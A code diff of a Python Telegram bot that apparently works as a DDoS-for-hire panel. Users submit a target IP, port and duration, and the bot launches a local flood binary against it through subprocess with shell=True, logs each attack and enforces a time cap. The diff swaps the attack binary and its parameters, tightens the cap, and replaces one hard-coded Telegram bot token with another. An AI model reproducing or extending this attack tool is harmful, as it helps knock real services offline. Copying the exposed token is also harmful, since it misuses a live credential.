@@ -10,7 +10,7 @@ import requests
 from requests.exceptions import RequestException
 
 # Replace with your actual bot token and admin IDs
-API_TOKEN = "7083053513:AAEKzeYBIy274514QEmMi2Xvn1esjQY3gZk"
+API_TOKEN = "7083053513:AAHGMdec0xA0cItB8VmFYnIhwKwiJwb9WCM"
 ADMIN_IDS = {1163610781}  # Example: set of admin IDs
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -136,7 +136,7 @@ def send_telegram_message(chat_id, text):
 def attack_thread(ip, port, attack_time, attack_id):
     try:
         start_time = time.time()
-        command = f"./11124 {ip} {port} {attack_time} 500"
+        command = f"./2511 {ip} {port} {attack_time} 900"
         process = subprocess.Popen(command, shell=True)
         time.sleep(attack_time)  # Wait for attack time
 
@@ -357,8 +357,8 @@ def attack(message):
             return
 
         # Validate time limit
-        if attack_time > 600:
-            bot.reply_to(message, "❗𝗘𝗿𝗿𝗼𝗿:𝘠𝘰𝘶 𝘊𝘢𝘯 𝘜𝘴𝘦 240 𝘚𝘦𝘤𝘰𝘯𝘥𝘴 𝘈𝘵 𝘢 𝘛𝘪𝘮𝘦")
+        if attack_time > 300:
+            bot.reply_to(message, "❗𝗘𝗿𝗿𝗼𝗿:𝘠𝘰𝘶 𝘊𝘢𝘯 𝘜𝘴𝘦 300 𝘚𝘦𝘤𝘰𝘯𝘥𝘴 𝘈𝘵 𝘢 𝘛𝘪𝘮𝘦")
             return
 
         c.execute("INSERT INTO attacks (ip, port, time, user_id, start_time, active) VALUES (?, ?, ?, ?, ?, 1)",
